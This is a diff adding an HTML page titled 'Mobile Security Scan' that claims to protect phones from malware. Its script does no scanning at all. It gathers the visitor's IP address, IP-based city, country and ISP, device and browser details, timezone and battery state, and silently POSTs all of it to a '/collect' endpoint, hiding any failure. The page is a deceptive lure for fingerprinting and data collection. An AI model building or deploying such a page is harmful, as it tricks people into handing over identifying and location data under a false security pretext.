@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>📱 Phone Security Scan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .scan-btn {
+            background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
+            margin-bottom: 20px;
+        }
+        
+        .scan-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(255, 107, 107, 0.4);
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #666;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #FF6B6B;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .result {
+            display: none;
+            text-align: left;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border-left: 4px solid #007AFF;
+        }
+        
+        .result-item {
+            margin-bottom: 8px;
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .result-item:last-child {
+            border-bottom: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">📱</div>
+        <h1>Mobile Security Scan</h1>
+        <p>Protect your device from malware and security threats. Click below to start comprehensive security analysis.</p>
+        
+        <button class="scan-btn" onclick="startPhoneScan()">
+            🔍 START SECURITY SCAN
+        </button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Analyzing device security...</p>
+        </div>
+        
+        <div class="result" id="result">
+            <h3>📊 Scan Results:</h3>
+            <div id="resultContent"></div>
+        </div>
+    </div>
+
+    <script>
+        async function startPhoneScan() {
+            // Show loading, hide result
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('result').style.display = 'none';
+            document.querySelector('.scan-btn').disabled = true;
+            
+            try {
+                // Collect device information
+                const deviceData = await collectAllData();
+                
+                // Display results on page
+                displayResults(deviceData);
+                
+                // Send to server (try, but don't fail if it doesn't work)
+                try {
+                    await sendToServer(deviceData);
+                } catch (serverError) {
+                    console.log('Server not available, but scan completed locally');
+                }
+                
+            } catch (error) {
+                document.getElementById('resultContent').innerHTML = 
+                    `<p style="color: red;">❌ Scan failed: ${error.message}</p>`;
+                document.getElementById('result').style.display = 'block';
+            } finally {
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.scan-btn').disabled = false;
+            }
+        }
+        
+        async function collectAllData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                
+                // Network Information
+                ip: await getIPAddress(),
+                location: await getLocation(),
+                
+                // Device Hardware Information
+                deviceInfo: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor || 'Unknown',
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 'Unknown'
+                },
+                
+                // Screen & Display
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                
+                // Browser & Software
+                browser: {
+                    name: navigator.appName,
+                    version: navigator.appVersion,
+                    language: navigator.language,
+                    languages: navigator.languages ? Array.from(navigator.languages) : ['Unknown'],
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine
+                },
+                
+                // Mobile Specific
+                mobile: {
+                    isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+                    userAgent: navigator.userAgent
+                },
+                
+                // Time & Timezone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
+            };
+
+            // Try to get battery info
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'Yes' : 'No'
+                    };
+                }
+            } catch (e) {
+                data.battery = { error: 'Not available' };
+            }
+
+            return data;
+        }
+        
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+
+        async function getLocation() {
+            try {
+                const ip = await getIPAddress();
+                if (ip === 'Unknown') return { error: 'Cannot determine location' };
+                
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                
+                return {
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown',
+                    timezone: data.timezone || 'Unknown'
+                };
+            } catch (error) {
+                return { error: 'Location services unavailable' };
+            }
+        }
+        
+        function displayResults(data) {
+            let html = '';
+            
+            // Device Info
+            html += `<div class="result-item"><strong>📱 Device:</strong> ${detectDeviceModel(data.deviceInfo.userAgent)}</div>`;
+            html += `<div class="result-item"><strong>🌐 IP Address:</strong> ${data.ip}</div>`;
+            
+            // Location
+            if (data.location && !data.location.error) {
+                html += `<div class="result-item"><strong>📍 Location:</strong> ${data.location.city}, ${data.location.country}</div>`;
+                html += `<div class="result-item"><strong>📡 ISP:</strong> ${data.location.isp}</div>`;
+            }
+            
+            // Hardware
+            html += `<div class="result-item"><strong>⚙️ Platform:</strong> ${data.deviceInfo.platform}</div>`;
+            html += `<div class="result-item"><strong>🧠 RAM:</strong> ${data.deviceInfo.deviceMemory} GB</div>`;
+            html += `<div class="result-item"><strong>🔢 CPU Cores:</strong> ${data.deviceInfo.hardwareConcurrency}</div>`;
+            html += `<div class="result-item"><strong>📺 Screen:</strong> ${data.screen.width} × ${data.screen.height}</div>`;
+            
+            // Browser
+            html += `<div class="result-item"><strong>🌐 Browser:</strong> ${data.browser.name}</div>`;
+            html += `<div class="result-item"><strong>🗣️ Language:</strong> ${data.browser.language}</div>`;
+            html += `<div class="result-item"><strong>🌍 Timezone:</strong> ${data.timezone}</div>`;
+            
+            // Battery
+            if (data.battery && data.battery.level) {
+                html += `<div class="result-item"><strong>🔋 Battery:</strong> ${data.battery.level} ${data.battery.charging === 'Yes' ? '(Charging)' : ''}</div>`;
+            }
+            
+            document.getElementById('resultContent').innerHTML = html;
+            document.getElementById('result').style.display = 'block';
+            
+            // Also log to console
+            console.log('📱 COMPLETE DEVICE SCAN DATA:', data);
+        }
+        
+        function detectDeviceModel(userAgent) {
+            const ua = userAgent.toLowerCase();
+            
+            // Infinix Detection
+            if (ua.includes('infinix')) {
+                if (ua.includes('smart 8') || ua.includes('x6827')) return 'Infinix Smart 8';
+                if (ua.includes('hot 60') || ua.includes('x6833')) return 'Infinix Hot 60 Pro';
+                return 'Infinix Device';
+            }
+            
+            // Other brands
+            const brands = {
+                'samsung': 'Samsung', 'xiaomi': 'Xiaomi', 'redmi': 'Redmi',
+                'oppo': 'OPPO', 'vivo': 'Vivo', 'realme': 'Realme',
+                'iphone': 'iPhone', 'ipad': 'iPad', 'huawei': 'Huawei'
+            };
+            
+            for (const [brand, name] of Object.entries(brands)) {
+                if (ua.includes(brand)) return `${name} Device`;
+            }
+            
+            return 'Unknown Device';
+        }
+        
+        async function sendToServer(data) {
+            try {
+                const response = await fetch('/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Server response not OK');
+                }
+                
+                console.log('✅ Data sent to server successfully');
+            } catch (error) {
+                console.log('⚠️ Could not send to server, but local scan completed');
+                // Don't throw error - we still want to show local results
+            }
+        }
+    </script>
+</body>
+</html>
+EOF
